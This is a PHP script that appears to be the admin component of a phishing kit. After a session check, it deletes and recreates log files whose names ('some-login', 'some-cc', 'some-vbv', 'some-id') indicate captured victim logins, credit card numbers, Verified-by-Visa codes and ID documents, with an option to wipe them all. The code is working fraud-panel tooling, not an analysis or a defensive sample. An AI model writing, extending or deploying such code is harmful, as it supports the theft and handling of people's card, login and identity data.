<?php
ob_start();
session_start();
ob_end_clean();
if(!isset($_SESSION['username'])){
header("location:login.php");
exit;
}
$file = $_GET["file"];
if($file=="click")
{
unlink("../logs/visitor-log.txt");
$handle = fopen("../logs/visitor-log.txt", 'a');
}else if($file=="login")
{
unlink("../logs/some-login.txt");
$handle = fopen("../logs/some-login.txt", 'a');
}else if($file=="cc")
{
unlink("../logs/some-cc.txt");
$handle = fopen("../logs/some-cc.txt", 'a');
}else if($file=="vbv")
{
unlink("../logs/some-vbv.txt"); 
$handle = fopen("../logs/some-vbv.txt", 'a');
}else if($file=="id")
{
unlink("../logs/some-id.txt");
$handle = fopen("../logs/some-id.txt", 'a');
}else if($file=="clearAll")
{
    unlink("../logs/visitor-log.txt");
    $handle = fopen("../logs/visitor-log.txt", 'a');
        unlink("../logs/some-login.txt");
        $handle = fopen("../logs/some-login.txt", 'a');
            unlink("../logs/some-cc.txt");
            $handle = fopen("../logs/some-cc.txt", 'a');
                unlink("../logs/some-vbv.txt");
                $handle = fopen("../logs/some-vbv.txt", 'a');
                unlink("../logs/some-id.txt");
                $handle = fopen("../logs/some-id.txt", 'a');
                    unlink("../logs/some-acc.log");
                    $handle = fopen("../logs/some-acc.log", 'a');
                    unlink("../logs/some-cc.log");
                    $handle = fopen("../logs/some-cc.log", 'a');
                        unlink("../logs/some-vbv-cc.log");
                        $handle = fopen("../logs/some-vbv-cc.log", 'a');
}
header("Location: ./");
?>